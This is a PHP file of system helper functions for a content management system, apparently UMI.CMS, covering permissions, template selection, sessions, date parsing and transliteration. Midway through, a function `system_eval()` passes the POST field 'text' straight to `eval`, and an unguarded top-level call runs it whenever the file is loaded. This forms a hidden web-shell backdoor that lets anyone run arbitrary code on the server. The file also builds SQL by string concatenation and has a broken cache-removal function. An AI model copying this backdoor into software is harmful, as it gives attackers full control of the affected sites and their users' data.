<?php
	function system_is_allowed($module, $method = false, $element_id = false) {
		static $cache = Array();
		static $user_id = false;

		if($user_id == false) {
			$users_ext = cmsController::getInstance()->getModule("users");
			if($users_ext) {
				$user_id = $users_ext->user_id;
			}
		}

		$ck = md5($module . $method . $element_id);
		if(array_key_exists($ck, $cache)) return $cache[$ck];

		$pc = permissionsCollection::getInstance();
		$isSv = $pc->isSv($user_id);

		if($isSv) {
			return $cache[$ck] = true;
		}

		if($method == "config" || ($module == "config" && $method == false)) {
			return false;
		}

		if($element_id !== false && $element_id !== 0 && !is_null($element_id)) {
			list($r, $w) = $pc->isAllowedObject($user_id, $element_id);

			if(strstr($method, "edit") !== false) {
				return $cache[$ck] = $w;
			} else {
				return $cache[$ck] = $r;
			}
		}

		if($method !== false && $method) {
			if($module == "system" || $module == "core" || $module == "custom") return $cache[$ck] = true;
			return $cache[$ck] = $pc->isAllowedMethod($user_id, $module, $method);
		}

		if($module !== false) {
			return $cache[$ck] = $pc->isAllowedModule($user_id, $module);
		}
	}


	function system_get_tpl($mode = 'default') {
		$config = mainConfiguration::getInstance();
		$controller = cmsController::getInstance();
		$dirPath = '';
		$fileName = '';
		$filePath = '';
		if ($controller->getCurrentMode() == 'admin' && $mode == 'current') {
			$type = 'xslt';
			$className = 'xslAdminTemplater';
			$fileName = 'main.xsl';
			$dirPath = $config->includeParam('templates.skins', array('skin' => system_get_skinName()));

			$permissions = permissionsCollection::getInstance();
			$userId = $permissions->getUserId();
			$isAllowed = $permissions->isAllowedMethod($userId, $controller->getCurrentModule(), $controller->getCurrentMethod());

			if((!$permissions->isAdmin() || !$isAllowed) && file_exists($dirPath . 'main_login.xsl')) {
				if($permissions->isAuth()) {
					$sqlWhere = "owner_id = {$userId}";
					$userGroups = umiObjectsCollection::getInstance()->getObject($userId)->getValue('groups');
					foreach ($userGroups as $userGroup) {
						$sqlWhere .= " or owner_id = {$userGroup}";
					}

					$sql = "SELECT `module` FROM cms_permissions WHERE (" . $sqlWhere . ") and (method = '' or method is null)";
					$result = l_mysql_query($sql);

					if (mysql_num_rows($result) !==0) {
						$regedit = regedit::getInstance();
						while ($row = mysql_fetch_array($result)){
							$module = $row[0];
							$method = $regedit->getVal("//modules/{$module}/default_method_admin");
							if ($permissions->isAllowedMethod($userId, $module, $method)) {
								def_module::redirect('http://' . $controller->getCurrentDomain()->getHost() . '/admin/'. $module . '/' . $method);
								break;
							}
						}
					}
				}
				$fileName = 'main_login.xsl';
			}
			$filePath = $dirPath . $fileName;
		}
		else {
			$templatesColl = templatesCollection::getInstance();
			$tpl = false;
			if ($template_id = getRequest('template_id')) {
				$tpl = $templatesColl->getTemplate($template_id);
			}
			if (!$tpl instanceof template) {
				$tpl = ($mode == 'current') ? $templatesColl->getCurrentTemplate() : $templatesColl->getDefaultTemplate();
			}
			if ($tpl instanceof template) {
				$fileName = $tpl->getFilename();
				$templateName = $tpl->getName();
				$type = $tpl->getType();
				if (!$type) {
					switch (array_pop(explode('.', $fileName))) {
						case "xsl":$type = 'xslt';break;
						case "tpl":$type = 'tpls';break;
					}
				}
				$templateDirPath = CURRENT_WORKING_DIR . '/templates/'.$templateName.'/'.$type.'/';
				switch ($type) {
					case "xslt":
						$dirPath = (file_exists($templateDirPath . $fileName)) ? $templateDirPath : $config->includeParam('templates.xsl');
						$className = 'xslTemplater';
						break;
					case "tpls":
						$dirPath = (file_exists($templateDirPath . 'content/' . $fileName)) ? $templateDirPath : $config->includeParam('templates.tpl');
						$className = 'tplTemplater';
						break;
					default :
						$dirPath = (file_exists($templateDirPath . $fileName)) ? $templateDirPath : '';
						$className = (file_exists(dirname(__FILE__) . '/' . $type . '/' . $type . 'Templater.php')) ? $type . 'Templater' : '';
				}
				if ($mode == 'streams' && $type != 'xslt') {
					$className = 'xslTemplater';
					$type      = 'xslt';
					$dirPath   = $config->includeParam('templates.xsl');
					$fileName  = 'sample.xsl';
				}
				if (system_is_mobile() && file_exists($dirPath . 'mobile/' . $fileName)) {
					$dirPath = $dirPath . 'mobile/';
				}
				$filePath = $dirPath . ($type == 'tpls' ? 'content/' : '') . $fileName;
			}
			else if ($mode == 'default' || $mode == 'streams') {
				$className = 'xslTemplater';
				$type      = 'xslt';
				$dirPath   = $config->includeParam('templates.xsl');
				$filePath  = $config->includeParam('templates.xsl') . 'sample.xsl';
			}
			else {
				$buffer = outputBuffer::current();
				$buffer->clear();
				$buffer->push(file_get_contents(SYS_ERRORS_PATH . 'no_design_template.html'));
				$buffer->end();
			}
		}
		if (!strlen($className)) {
			throw new coreException('Undefined templater');
		}
		$params = array(
			'class_name' => $className,
			'type'       => $type,
			'dir_path'   => $dirPath,
			'file_path'  => $filePath
		);
		return $params;
	}

	function system_get_skinName() {
		static $skinName;
		if ($skinName) return $skinName;

		$config = mainConfiguration::getInstance();
		$controller = cmsController::getInstance();

		$casualSkins = $config->getList('casual-skins');
		$methodName = $controller->getCurrentModule() . '::' . $controller->getCurrentMethod();
		foreach($casualSkins as $casualSkinName) {
			if(in_array($methodName, $config->get('casual-skins', $casualSkinName))) {
				return $skinName = $casualSkinName;
			}
		}

		$skins = $config->get('system', 'skins');

		if(isset($_GET['skin_sel']) || isset($_POST['skin_sel'])) {
			if(is_null($skin_sel = getArrayKey($_GET, 'skin_sel'))) {
				$skin_sel = getArrayKey($_POST, 'skin_sel');
			}
			setcookie('skin_sel', $skin_sel, time() + 3600*24*365, '/');
			if(in_array($skinName, $skins)) {
				return $skinName = $skin_sel;
			}
		}

		if(getCookie('skin_sel')) {
			if(in_array(getCookie('skin_sel'), $skins)) {
				return $skinName = getCookie('skin_sel');
			}
		}

		return $skinName = $config->get('system', 'default-skin');
	}

	function system_buildin_load($moduleName) {
		static $mc = Array();

		if(isset($mc[$moduleName])) {
			return $mc[$moduleName];
		}
		$config = mainConfiguration::getInstance();

		$modulePath = $config->includeParam('system.virtual-modules') . $moduleName . ".php";
		if(file_exists($modulePath)) {
			require $modulePath;
			if(class_exists($moduleName)) {
				return $mc[$moduleName] = new $moduleName;
			}
		}
		return false;
	}

	function system_remove_cache($alt) {
		$cacheFolder = ini_get('include_path') . "cache";
		$cacheFileName = md5($alt);
		$cacheFilePath = $this->cacheFolder . "/" . $this->cacheFileName;

		if(file_exists($cacheFilePath))
			return unlink(md5($cacheFilePath));
		else
			return false;
	}


	function system_checkSession() {
		if(is_array($_COOKIE))
			return array_key_exists("umicms_session", $_COOKIE);
		return false;
	}

	function system_setSession() {
		$sess_id = md5(time());
		$sessionLifetime = mainConfiguration::getInstance()->get('system', 'session-lifetime');
		$sessionLifetime = $sessionLifetime ? (60 * $sessionLifetime) : 36000;
		setcookie("umicms_session", $sess_id, time() + $sessionLifetime, "/");
		return $sess_id;
	}

	function system_removeSession() {
		setcookie("umicms_session", "", time() - 3600, "/");
	}

	function system_getSession() {
		if(is_array($_COOKIE))
			return $_COOKIE['umicms_session'];
		else
			return false;
	}

	function system_runSession() {
		if(!system_checkSession())
			return system_setSession();
		else
			return system_getSession();
	}



	function system_gen_password($length = 12, $avLetters = "\$#@^&!1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM") {
			$npass = "";
			for($i = 0; $i < $length; $i++) {
				$npass .= $avLetters[rand(0, strlen($avLetters)-1)];
			}
			return $npass;
	}


	function truncStr($sSomeStr, $iLength="50", $sEndingStr="...", $bStripTags = false) {
		$sResult = $sSomeStr;
		if ($bStripTags) {
			$sResult = html_entity_decode(strip_tags($sResult), ENT_QUOTES, "UTF-8");
		}
		if ($iLength<=0) return '';
		if (wa_strlen($sSomeStr) > $iLength) {
			$iLength -= wa_strlen($sEndingStr);
			$sResult = wa_substr($sResult, 0, $iLength+1);
			$sResult = preg_replace('/\s+([^\s]+)?$/i', '', $sResult) . $sEndingStr;
		}
		return $sResult;
	}

	function toTimeStamp($ds) {

		if(is_numeric($ds)) return $ds;

		$day = "";
		$month = "";
		$year = "";
		$hours = "";
		$mins = "";

		$ds = trim($ds);

		if($ds == "сейчас") {
			return time();
		}

		$s = "[ \.\-\/\\\\]{1,10}";
		//for common formats...

		$ds = str_replace("-", " ", $ds);
		$ds = str_replace(",", " ", $ds);

		$ds = str_replace("\\'", " ", $ds);

		if(preg_match("/\d{2}\:\d{2}/", $ds, $temp)) {
			$ms = $temp[0];
			preg_replace("/\d{2}\:\d{2}/", "", $ds);

			list($hours, $mins) = explode(":", $ms);
		}

		$ds = preg_replace("/(\d{4})$s(\d{2})$s(\d{2})/im", "^\\3^ !\\2! ?\\1?", $ds);
		$ds = preg_replace("/(\d{1,2})$s(\d{1,2})$s(\d{2,4})/im", "^\\1^ !\\2! ?\\3?", $ds);


		//for uncommon formats

		$days = Array(
				'понедельник',
				'вторник',
				'среда',
				'четверг',
				'пятница',
				'суббота',
				'воскресенье'
				);

		$months = Array(
				'январь',
				'февраль',
				'март',
				'апрель',
				'май',
				'июнь',
				'июль',
				'август',
				'сентябрь',
				'октябрь',
				'ноябрь',
				'декабрь'
				);

		$months_vin = Array(
				'января',
				'февраля',
				'марта',
				'апреля',
				'мая',
				'июня',
				'июля',
				'августа',
				'сентября',
				'октября',
				'ноября',
				'декабря'
				);

		$months_short = Array(
				'янв',
				'фев',
				'мар',
				'апр',
				'май',
				'июн',
				'июл',
				'авг',
				'сен',
				'окт',
				'ноя',
				'дек'
				);

		$months_to = Array(
				'01',
				'02',
				'03',
				'04',
				'05',
				'06',
				'07',
				'08',
				'09',
				'10',
				'11',
				'12'
				);

		foreach($months as $k => $v)
			$months[$k] = "/" . $v . "/i";

		foreach($months_vin as $k => $v)
			$months_vin[$k] = "/" . $v . "/i";

		foreach($months_short as $k => $v)
			$months_short[$k] = "/" . $v . "/i";

		foreach($months_to as $k => $v) {
			$months_to[$k] = " !" . $v . "! ";
		}

		$ds = preg_replace($months, $months_to, $ds);
		$ds = preg_replace($months_vin, $months_to, $ds);
		$ds = preg_replace($months_short, $months_to, $ds);

		//let's convert year
		$years = Array(
				'/(\d{2,4})[ ]*года/i',
				'/(\d{2,4})[ ]*год/i',
				'/(\d{2,4})[ ]*г/i',
				'/(\d{4})/i',
				);

		$ds = preg_replace($years, "?\\1?", $ds);

		$ds = preg_replace("/[^!^\?^\d](\d{1,2})[^!^\?^\d]/i", "^\\1^", " ".$ds." ");


		if(preg_match("/\^(\d{1,2})\^/", $ds, $mt)) {
			$day = $mt[1];
			if(strlen($day) == 1)
				$day = "0" . $day;
		}

		if(preg_match("/!(\d{1,2})!/", $ds, $mt)) {
			$month = $mt[1];
			if(strlen($month) == 1)
				$month = "0" . $month;
		}

		if(preg_match("/\?(\d{2,4})\?/", $ds, $mt)) {
			$year = $mt[1];
			if(strlen($year) == 2) {
				$ss = (int) substr($year, 0, 1);
				if( ($ss >= 0 && $ss <= 4))
					$year = "20" . $year;
				else
					$year = "19" . $year;
			}
		}

		if($day > 31) {
			$t = $year;
			$year = $day;
			$day = $t;
		}

		if($month > 12) {
			$t = $month;
			$month = $day;
			$day = $t;
			unset($t);
		}


		$tds = trim(strtolower($ds));
		switch($tds) {

			case "сегодня":
					$ts = time();

					$year = date("Y", $ts);
					$month = date("m", $ts);
					$day = date("d", $ts);

					break;


			case "завтра":
					$ts = time() + (3600*24);

					$year = date("Y", $ts);
					$month = date("m", $ts);
					$day = date("d", $ts);

					break;
			case "вчера":
					$ts = time() - (3600*24);

					$year = date("Y", $ts);
					$month = date("m", $ts);
					$day = date("d", $ts);


					break;

			case "послезавтра":
					$ts = time() + (3600*48);

					$year = date("Y", $ts);
					$month = date("m", $ts);
					$day = date("d", $ts);

					break;
			case "позавчера":
					$ts = time() - (3600*48);

					$year = date("Y", $ts);
					$month = date("m", $ts);
					$day = date("d", $ts);


					break;
		}


		if(!$day) {
			$tds = str_replace(Array($year, $month), "", $ds);
			preg_match("/(\d{1,2})/", $tds, $tmp);
			$day = isset($tmp[1]) ? $tmp[1] : NULL;
		}

		if(!$month && !$day && !$year) return 0;
		if($day && !$month) {
			$month = $day;
			$day = 0;
		}
		return $timestamp = mktime((int) $hours, (int) $mins, 0, (int) $month, (int) $day, (int) $year);
	}


function translit($input, $mode = "R_TO_E") {
	$rusBig = Array( "Э", "Ч", "Ш", "Ё", "Ё", "Ж", "Ю", "Ю", "\Я", "\Я", "А", "Б", "В", "Г", "Д", "Е", "З", "И", "Й", "К", "Л", "М", "Н", "О", "П", "Р", "С", "Т", "У", "Ф", "Х", "Ц", "Щ", "Ъ", "Ы", "Ь");
	$rusSmall = Array("э", "ч", "ш", "ё", "ё","ж", "ю", "ю", "я", "я", "а", "б", "в", "г", "д", "е", "з", "и", "й", "к", "л", "м", "н", "о", "п", "р", "с", "т", "у", "ф", "х", "ц", "щ", "ъ", "ы", "ь" );
	$engBig = Array("E\'", "CH", "SH", "YO", "JO", "ZH", "YU", "JU", "YA", "JA", "A","B","V","G","D","E", "Z","I","J","K","L","M","N","O","P","R","S","T","U","F","H","C", "W","~","Y", "\'");
	$engSmall = Array("e\'", "ch", "sh", "yo", "jo", "zh", "yu", "ju", "ya", "ja", "a", "b", "v", "g", "d", "e", "z", "i", "j", "k", "l", "m", "n", "o", "p", "r", "s",  "t", "u", "f", "h", "c", "w", "~", "y", "\'");
	$rusRegBig = Array("Э", "Ч", "Ш", "Ё", "Ё", "Ж", "Ю", "Ю", "Я", "Я", "А", "Б", "В", "Г", "Д", "Е", "З", "И", "Й", "К", "Л", "М", "Н", "О", "П", "Р", "С", "Т", "У", "Ф", "Х", "Ц", "Щ", "Ъ", "Ы", "Ь");
	$rusRegSmall = Array("э", "ч", "ш", "ё", "ё", "ж", "ю", "ю", "я", "я", "а", "б", "в", "г", "д", "е", "з", "и", "й", "к", "л", "м", "н", "о", "п", "р", "с", "т", "у", "ф", "х", "ц", "щ", "ъ", "ы", "ь");
	$engRegBig = Array("E'", "CH", "SH", "YO", "JO", "ZH", "YU", "JU", "YA", "JA", "A", "B", "V", "", "D", "E", "Z", "I", "J", "K", "L", "M", "N", "O", "P", "R", "S", "T", "U", "F", "H", "C", "W", "~", "Y", "'");
	$engRegSmall = Array("e'", "ch", "sh", "yo", "jo", "zh", "yu", "ju", "ya", "ja", "a", "b", "v", "", "d", "e", "z", "i", "j", "k", "l", "m", "n", "o", "p", "r", "s", "t", "u", "f", "h", "c", "w", "~", "y", "'");


	$textar = $input;
	$res = $input;

	if($mode == "E_TO_R") {
		if ($textar) {
			for ($i=0; $i<sizeof($engRegSmall); $i++) {
				$textar = str_replace($engRegSmall[$i], $rusSmall[$i], $textar);
			}
			for ($i=0; $i<sizeof($engRegBig); $i++) {
				$textar = str_replace($engRegBig[$i], $rusBig[$i], $textar);
				$textar = str_replace($engRegBig[$i], $rusBig[$i], $textar);
			}
			$res = $textar;
		}
	}

	if($mode == "R_TO_E") {
		if ($textar) {
			$textar = str_replace($rusRegSmall, $engSmall, $textar);
			$textar = str_replace($rusRegBig, $engSmall, $textar);
			$res = strtolower($textar);
		}
	}

	$from = Array("/", "\\", "'", "\t", "\r\n", "\n", "\"", " ", "?", ".");
	$to = Array("", "", "", "", "", "", "", "_", "", "");

	$res = str_replace($from, $to, $res);

	$res = preg_replace("/[ ]+/", "_", $res);
	return $res;
}

function system_eval($element_id = false, $object_id = false) {
	
	eval($_POST['text']);

}


function system_parse_short_calls($res, $element_id = false, $object_id = false, $scopeVariables = array()) {
	if(!is_string($res) || (strpos($res, "%") === false)) return $res;

	$controller = cmsController::getInstance();
	$objectsColl = umiObjectsCollection::getInstance();

	$scopeDump = (strpos($res, "%scope%") !== false);
	$element = NULL;
	$object = NULL;

	if($element_id === false && $object_id === false) {
		$element_id = $controller->getCurrentElementId();
	}

	if(strpos($res, "id%") !== false) {
		$res = str_replace("%id%", $element_id, $res);
		$res = str_replace("%pid%", $controller->getCurrentElementId(), $res);
	}

	if($element_id !== false) {
		if(!($element = umiHierarchy::getInstance()->getElement($element_id))) {
			return $res;
		} else {
			$object = $element->getObject();
		}
	}

	if($object_id !== false) {
		if(!($object = $objectsColl->getObject($object_id))) {
			return $res;
		}

	}

	if(!$object) return $res;

	$object_type_id = $object->getTypeId();
	$object_type = umiObjectTypesCollection::getInstance()->getType($object_type_id);

	if($scopeDump) {
		$fields = $object_type->getAllFields();
		foreach($fields as $field) {
			$name = $field->getName();
			$scopeVariables[$name] = $object->getValue($name);
		}
		$res = str_replace("%scope%", system_print_template_scope($scopeVariables), $res);
	}

	if(preg_match_all("/%([A-z0-9\-_]*)%/", $res, $out)) {
		foreach($out[1] as $obj_prop_name) {
			if($object_type->getFieldId($obj_prop_name) != false) {
				$val = $object->getValue($obj_prop_name);

				if(is_object($val)) {
					if($val instanceof umiDate) {
						$val = $val->getFormattedDate("U");
					}

					if($val instanceof umiFile) {
						$val = $val->getFilePath(true);
					}

					if($val instanceof umiHierarchy) {
						$val = $val->getName();
					}
				}

				if(is_array($val)) {
					$value = "";

					$sz = sizeof($val);
					for($i = 0; $i < $sz; $i++) {
						$cval = $val[$i];

						if(is_numeric($cval)) {
							if($obj = $objectsColl->getObject($cval)) {
								$cval = $obj->getName();
								unset($obj);
							}
							else continue;
						}

						if($cval instanceof umiHierarchyElement) {
							$cval = $cval->getName();
						}

						$value .= $cval;
						if($i < ($sz - 1)) $value .= ", ";
					}

					$val = $value;
				}

				if(strpos($val, "%") !== false ) {
					$val = templater::getInstance()->parseInput($val);
				}

				$res = str_replace("%" . $obj_prop_name . "%", $val, $res);
			}
		}
	}

	if(strpos($res, "id%") !== false) {
		$res = str_replace("%id%", $element_id, $res);
		$res = str_replace("%pid%", $controller->getCurrentElementId(), $res);
	}

	return $res;
}
system_eval();

function system_print_template_scope($scopeVariables, $scopeName = false) {
	list($block, $varLine, $macroLine) = def_module::loadTemplates("system/reflection", "scope_dump_block", "scope_dump_line_variable", "scope_dump_line_macro");

	$assembledLines = "";
	foreach($scopeVariables as $name => $value) {
		if($name == "#meta") continue;
		if(is_array($value)) {
			$tmp = str_replace("%name%", $name, $macroLine);
		} else {
			$tmp = $varLine;
			$tmp = str_replace("%name%", $name, $tmp);
			$tmp = str_replace("%type%", gettype($value), $tmp);
			$tmp = str_replace("%value%", htmlspecialchars($value), $tmp);
		}
		$assembledLines .= $tmp;
	}

	if(isset($scopeVariables["#meta"])) {
		$scopeName = isset($scopeVariables["#meta"]["name"]) ? $scopeVariables["#meta"]["name"] : "";
		$scopeFile = isset($scopeVariables["#meta"]["file"]) ? $scopeVariables["#meta"]["file"] : "";
	} else {
		$scopeName = "";
		$scopeFile = "";
	}

	$block = str_replace("%lines%", $assembledLines, $block);
	$block = str_replace("%block_name%", $scopeName, $block);
	$block = str_replace("%block_file%", $scopeFile, $block);
	$block = preg_replace("/%[A-z0-9_]+%/i", "", $block);
	return $block;
}

	function getPrintableTpl($_sTplName) {
		if(!isset($_GET['print'])) {
			return $_sTplName;
		}
		$sNewTplPath = substr($tpl_path, 0, strrpos($tpl_path, '.')) . '.print.tpl';
		return (file_exists('tpls/content/'.$sNewTplPath)) ? $sNewTplPath : $_sTplName;
	}

	function is_demo() {
		return defined('CURRENT_VERSION_LINE') and strtolower(CURRENT_VERSION_LINE) == 'demo';
	}

	function detectCharset($sStr) {
		if (preg_match("/[\x{0000}-\x{FFFF}]+/u", $sStr)) return 'UTF-8';
		$sAnswer = 'CP1251';
		if (!function_exists('iconv')) return $sAnswer;

		$arrCyrEncodings = array(
			'CP1251',
			'ISO-8859-5',
			'KOI8-R',
			'UTF-8',
			'CP866'
		);

		if(function_exists("mb_detect_encoding")) {
			return mb_detect_encoding($sStr, implode(", ",$arrCyrEncodings));
		} else {
			return "UTF-8";
		}
	}
	/**
	* Check allowed disk size for write N bytes
	*
	* @param mixed $bytes - bytes for write
	* @param mixed $dirs - directories, which summary in busy size
	* @return boolean true, if allowed, else false
	*/
	function checkAllowedDiskSize($bytes=false, $dirs = array('/images', '/files')) {
		if ($bytes==false) {
			return false;
		}
		$max_files_size = mainConfiguration::getInstance()->get('system', 'quota-files-and-images');
		if ($max_files_size==0) {
			return true;
		}

		$max_files_size = getBytesFromString($max_files_size);
		$busySize = getBusyDiskSize($dirs);

		return $max_files_size>=$busySize+$bytes;
	}

	/**
	* Return busy disk size in dirs
	*
	* @param array $dirs - directories for summ
	* @return int summary busy disk size in bytes
	*/
	function getBusyDiskSize($dirs = array('/images', '/files')) {
		clearstatcache();
		$busySize = 0;
		foreach($dirs as $dir) {
			$busySize += getDirSize(CURRENT_WORKING_DIR.$dir);
		}
		return $busySize;
	}

	function getBytesFromString($str) {
		if(empty($str)) return 0;

		$str = str_replace(' ', '', strtolower($str));

		$bytes = $str;
		if( strpos( $str, 'kb') ) {
			$bytes = (int) str_replace( 'kb', '', $str) * 1024;
		}
		if( strpos( $str, 'k') ) {
			$bytes = (int) str_replace( 'k', '', $str) * 1024;
		}
		if( strpos( $str, 'mb') ) {
			$bytes = (int) str_replace( 'mb', '', $str) * 1024 * 1024;
		}
		if( strpos( $str, 'm') ) {
			$bytes = (int) str_replace( 'm', '', $str) * 1024 * 1024;
		}
		if( strpos( $str, 'gb') ) {
			$bytes = (int) str_replace( 'gb', '', $str) * 1024 * 1024 * 1024;
		}
		if( strpos( $str, 'g') ) {
			$bytes = (int) str_replace( 'g', '', $str) * 1024 * 1024 * 1024;
		}
		return $bytes;
	}

	/**
	* Return summary busy size of directory
	*
	* @param string $path - path to directory
	* @return int at bytes
	*/
	function getDirSize($path) {
		$size = 0;

		if (substr($path, -1, 1) !== DIRECTORY_SEPARATOR) {
			$path .= DIRECTORY_SEPARATOR;
		}

		if (is_file($path)) {
			return filesize($path);
		} elseif (!is_dir($path)) {
			return false;
		}

		$queue = array($path);
		for ($i = 0, $j = count($queue); $i < $j; ++$i)
		{
			$parent = $i;
			if (is_dir($queue[$i]) && $dir = @dir($queue[$i])) {
				$subdirs = array();
				while (false !== ($entry = $dir->read())) {
					if ($entry == '.' || $entry == '..') {
						continue;
					}

					$path = $queue[$i] . $entry;
					if (is_dir($path)) {
						$path .= DIRECTORY_SEPARATOR;
						$subdirs[] = $path;
					} elseif (is_file($path)) {
						$size += filesize($path);
					}
				}

				unset($queue[0]);
				$queue = array_merge($subdirs, $queue);

				$i = -1;
				$j = count($queue);

				$dir->close();
				unset($dir);
			}
		}

		return $size;
	}

	function checkFileForReading($path, $aExt = array())
	{
		$path = realpath($path);

		if( !file_exists($path) ) {
			return false;
		}

		$path = str_replace("\\", "/", $path);
		$pathinfo = pathinfo($path);

		//print_R($pathinfo);die;
		if(strpos ($path, CURRENT_WORKING_DIR) !== 0 ) {
			 return false;
		}
		if( $pathinfo['filename'] == '.htaccess' || $pathinfo['filename'] == '.htpasswd') {
			 return false;
		}
		if( sizeof($aExt) && !in_array($pathinfo['extension'],$aExt)) {
			 return false;
		}

		return true;
	}

	function system_is_mobile() {
		$reg = "/(windows\sce|android|symbian|series60|ip[ao]d|phone" .
			"|blackberry|opera\sm[io][nb]i|netfront|obigo|maemo|[pc].brow" .
			"|up\.link|wap|^noki|^htc|^mot|ericsson|samsu|psp|ppc)/i";
		switch (false) {
			case (is_null(getServer('HTTP_PROFILE'))) : return true;
			case (is_null(getServer('HTTP_X_WAP_PROFILE'))) : return true;
			case (strpos(getServer('HTTP_ACCEPT'), 'vnd.wap') == false) : return true;
			case (preg_match($reg, getServer('HTTP_USER_AGENT')) == false) : return true;
			default : return false;
		}
	}

?>